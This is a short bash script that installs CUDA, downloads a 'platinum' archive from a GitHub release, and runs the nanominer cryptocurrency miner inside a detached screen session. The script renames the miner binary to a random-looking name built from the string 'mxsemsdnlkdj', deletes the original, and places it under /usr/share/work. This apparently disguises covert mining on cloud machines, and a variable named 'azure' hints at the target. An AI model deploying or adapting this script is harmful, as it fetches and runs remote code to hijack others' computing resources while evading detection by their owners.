#!/bin/bash
apt-get update && apt-get install -y docker.io screen
apt-get install -y git wget
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
wget https://developer.download.nvidia.com/compute/cuda/12.1.1/local_installers/cuda-repo-ubuntu2004-12-1-local_12.1.1-530.30.02-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu2004-12-1-local_12.1.1-530.30.02-1_amd64.deb
sudo cp /var/cuda-repo-ubuntu2004-12-1-local/cuda-*-keyring.gpg /usr/share/keyrings/
sudo apt-get update
sudo apt-get -y install cuda
rm -r /usr/share/work/$azure
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/platinum
wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum.tar.gz
mv platinum.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar xf platinum.tar.gz
rm -rf platinum.tar.gz && cd platinum
mv nanominer $azure -n
cp $azure "$cpuname"
rm -f  nanominer
echo $cpuname" is starting"
screen -d -m ./"${cpuname}"
